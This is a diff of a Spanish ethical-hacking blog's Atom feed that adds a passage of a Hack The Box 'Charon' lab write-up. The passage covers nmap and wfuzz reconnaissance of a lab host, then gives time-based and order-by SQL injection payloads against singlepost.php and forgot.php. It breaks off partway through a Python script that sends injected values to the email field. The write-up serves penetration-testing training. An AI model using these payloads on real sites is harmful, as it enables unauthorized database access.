@@ -1,4 +1,786 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-01-09T20:08:49-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">K4miyo | Ciberseguridad!</title><subtitle>Artículos relacinados al hacking ético en diferentes plataformas</subtitle><author><name>K4miyo</name></author><entry><title type="html">Hack The Box Obscurity</title><link href="http://localhost:4000/htb-obscurity/" rel="alternate" type="text/html" title="Hack The Box Obscurity" /><published>2022-01-09T00:00:00-06:00</published><updated>2022-01-09T00:00:00-06:00</updated><id>http://localhost:4000/htb-obscurity</id><content type="html" xml:base="http://localhost:4000/htb-obscurity/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-obscurity/banner-obscurity.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-01-11T21:28:23-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">K4miyo | Ciberseguridad!</title><subtitle>Artículos relacinados al hacking ético en diferentes plataformas</subtitle><author><name>K4miyo</name></author><entry><title type="html">Hack The Box Charon</title><link href="http://localhost:4000/htb-obscurity/" rel="alternate" type="text/html" title="Hack The Box Charon" /><published>2022-01-11T00:00:00-06:00</published><updated>2022-01-11T00:00:00-06:00</updated><id>http://localhost:4000/htb-obscurity</id><content type="html" xml:base="http://localhost:4000/htb-obscurity/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-charon/banner-charon.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;charon&quot;&gt;Charon&lt;/h2&gt;
+&lt;p&gt;Se procede con la fase de reconocimiento lanzando primeramente un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ping&lt;/code&gt; a la dirección IP 10.10.10.31.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ping &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 1 10.10.10.31
+PING 10.10.10.31 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.10.31&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 56&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;84&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; bytes of data.
+64 bytes from 10.10.10.31: &lt;span class=&quot;nv&quot;&gt;icmp_seq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1 &lt;span class=&quot;nv&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;63 &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;142 ms
+
+&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; 10.10.10.31 ping statistics &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
+1 packets transmitted, 1 received, 0% packet loss, &lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;0ms
+rtt min/avg/max/mdev &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 142.073/142.073/142.073/0.000 ms
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Linux. A continuación se procede con la ejecución de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; para determinar los puertos abiertos de la máquina y exportanto la información al archivo &lt;strong&gt;allPorts&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 5000 &lt;span class=&quot;nt&quot;&gt;-vvv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; 10.10.10.31 &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; allPorts
+Host discovery disabled &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; All addresses will be marked &lt;span class=&quot;s1&quot;&gt;'up'&lt;/span&gt; and scan &lt;span class=&quot;nb&quot;&gt;times &lt;/span&gt;may be slower.
+Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2022-01-09 20:17 CST
+Initiating SYN Stealth Scan at 20:17
+Scanning 10.10.10.31 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;65535 ports]
+Discovered open port 22/tcp on 10.10.10.31
+Discovered open port 80/tcp on 10.10.10.31
+Completed SYN Stealth Scan at 20:17, 26.47s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;65535 total ports&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.31
+Host is up, received user-set &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.14s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Scanned at 2022-01-09 20:17:33 CST &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;26s
+Not shown: 65533 filtered tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;no-response&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Some closed ports may be reported as filtered due to &lt;span class=&quot;nt&quot;&gt;--defeat-rst-ratelimit&lt;/span&gt;
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 63
+80/tcp open  http    syn-ack ttl 63
+
+Read data files from: /usr/bin/../share/nmap
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;26.54 seconds
+           Raw packets sent: 131086 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;5.768MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | Rcvd: 20 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;880B&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Mediante la función &lt;a href=&quot;/extractPorts&quot;&gt;extractPorts&lt;/a&gt; definida a nivel de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zsh&lt;/code&gt; , se obtiene la información más relevante de la captura grepeable.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ extractPorts allPorts
+───────┬─────────────────────────────────────
+       │ File: extractPorts.tmp
+───────┼─────────────────────────────────────
+   1   │ 
+   2   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Extracting information...
+   3   │ 
+   4   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; IP Address: 10.10.10.31
+   5   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Open ports: 22,80
+   6   │ 
+   7   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Ports copied to clipboard
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-sCV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p22&lt;/span&gt;,80 10.10.10.31 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; targeted
+Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2022-01-09 20:18 CST
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.31
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.14s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+| ssh-hostkey: 
+|   2048 09:c7:fb:a2:4b:53:1a:7a:f3:30:5e:b8:6e:ec:83:ee &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|   256 97:e0:ba:96:17:d4:a1:bb:32:24:f4:e5:15:b4:8a:ec &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_  256 e8:9e:0b:1c:e7:2d:b6:c9:68:46:7c:b3:32:ea:e9:ef &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+80/tcp open  http    Apache httpd 2.4.18 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
+|_http-server-header: Apache/2.4.18 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_http-title: Frozen Yogurt Shop
+Service Info: OS: Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;12.42 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Vemos el puerto 80 abierto, así que comos simpre vamos a ver a lo que nos enfrentamos con la herramienta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;whatweb&lt;/code&gt; antes de ver su contenido vía web.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ whatweb http://10.10.10.31/
+http://10.10.10.31/ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)]&lt;/span&gt;, IP[10.10.10.31], PoweredBy[:], Script[text/javascript], Title[Frozen Yogurt Shop]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;No vemos nada interesante, asi que ahora si vamos a valir vía web.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-charon/charon-web.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Analizando un poco el sitio web, vemos que tenemos las opciones &lt;strong&gt;HOME&lt;/strong&gt;, &lt;strong&gt;ABOUT&lt;/strong&gt; y &lt;strong&gt;BLOG&lt;/strong&gt;. Dentro de &lt;strong&gt;BLOG&lt;/strong&gt; tenemos algunas opciones que si seleccionamos, tenemos en la dirección URL el parámetro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;id&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-charon/charon-web1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-charon/charon-web2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Si cambianos el valor del &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;id&lt;/code&gt;, tenemos que cambia lo que visualizamos vía web y para este caso, sólo tenemos las opciones 10, 11 y 12; para las demás opciones, el texto desaparece. Por lo tanto, podríamos pensar en realizar una inyección SQL (&lt;strong&gt;&lt;em&gt;SQLi&lt;/em&gt;&lt;/strong&gt;):&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://10.10.10.31/singlepost.php?id=10'-- -&lt;/code&gt; No vemos nada.&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://10.10.10.31/singlepost.php?id=10' order by 100-- -&lt;/code&gt; No se nos visualiza nada.&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://10.10.10.31/singlepost.php?id=10 and sleep(5)-- -&lt;/code&gt; Vemos que el navegador tarda 5 segundos en responder, por lo tanto el sitio es vulnerabla a ataques de tipo SQLi basado en tiempo.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Como vemos que el recurso es vulnerable a SQLi basado en tiempo. Pensando un poco, podríamos intuir que existen algún gestor de contenido o un panel de login debido a que por detrar está presenta una base de datos. Asi que vamos a tratar de descubrir rutas dentro del servidor web.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ wfuzz &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; 200 &lt;span class=&quot;nt&quot;&gt;--hc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;404 &lt;span class=&quot;nt&quot;&gt;--hw&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;191 &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  http://10.10.10.31/FUZZ
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&lt;span class=&quot;s1&quot;&gt;'s documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.10.31/FUZZ
+Total requests: 220560
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                         
+=====================================================================
+
+000000016:   403        11 L     32 W       293 Ch      &quot;images&quot;                                                        
+000000550:   403        11 L     32 W       290 Ch      &quot;css&quot;                                                           
+000000953:   403        11 L     32 W       289 Ch      &quot;js&quot;                                                            
+000001112:   403        11 L     32 W       294 Ch      &quot;include&quot;                                                       
+000002771:   403        11 L     32 W       292 Ch      &quot;fonts&quot;                                                         
+000047682:   403        11 L     32 W       294 Ch      &quot;cmsdata&quot;                                                       
+^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...
+
+Total time: 112.0082
+Processed Requests: 61385
+Filtered Requests: 61379
+Requests/sec.: 548.0399
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Vemos un recurso intersante llamado &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cmsdata&lt;/code&gt;; sin embargo, tiene un código de estado 403 (Forbidden). Pensando un poco, es posible que podamos obtener recursos dentro de ese directorio que nos regrese un código de estado 200. Así que lo primero que haremos, es buscar archivos de extensión php.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ wfuzz &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; 200 &lt;span class=&quot;nt&quot;&gt;--hc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;404 &lt;span class=&quot;nt&quot;&gt;--hw&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;32 &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  http://10.10.10.31/cmsdata/FUZZ.php
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&lt;span class=&quot;s1&quot;&gt;'s documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.10.31/cmsdata/FUZZ.php
+Total requests: 220560
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                         
+=====================================================================
+
+000000282:   200        97 L     606 W      6426 Ch     &quot;menu&quot;                                                          
+000000366:   200        97 L     606 W      6426 Ch     &quot;upload&quot;                                                        
+000000053:   200        97 L     606 W      6426 Ch     &quot;login&quot;                                                         
+000001706:   200        96 L     596 W      6322 Ch     &quot;forgot&quot;                                                        
+^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...
+
+Total time: 0
+Processed Requests: 7160
+Filtered Requests: 7156
+Requests/sec.: 0
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Aqui ya tenemos unos archivos que ya debería de llamarnos la atención sería &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;login.php&lt;/code&gt;; asi que vamos a echarle un ojo.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-charon/charon-web3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Podríamos tratar de ingresar credenciales default o típicas; sin embargo, no vamos a conseguir nada. Como sabemos que el sitio es vulnerable a ataques de SQLi, vamos a tratar de inyectar algunos comandos. Para el panel de login no logramos nada; pero si intentamos sobre el recurso &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;forgot.php&lt;/code&gt;, vemos que se nos muestra una leyenda &lt;strong&gt;Incorrect format&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-charon/charon-web4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;' order by 100-- -&lt;/code&gt; - Incorrect format&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;test@test.com' order by 100-- -&lt;/code&gt; - Error in Database!&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Con la inyección anterior, vemos un resultado diferente.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-charon/charon-web5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Para trabajar de una forma más cómoda y poder realizar pruebas, vamos a generar un script en python que nos permita realizar las consultas que necesitemos.&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/python3
+#coding:utf-8
+&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;signal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;re&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;def_handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sig&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;frame&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[!] Saliendo...&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;signal&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;signal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;signal&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SIGINT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;def_handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# Variables globales
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;http://10.10.10.31/cmsdata/forgot.php&quot;&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;makeRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sqli_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;post_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;s&quot;&gt;&quot;email&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sqli_data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;re&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;findall&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;r'h2.*'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&amp;gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lstrip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;except&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;failure&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Ha ocurrido un error!&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
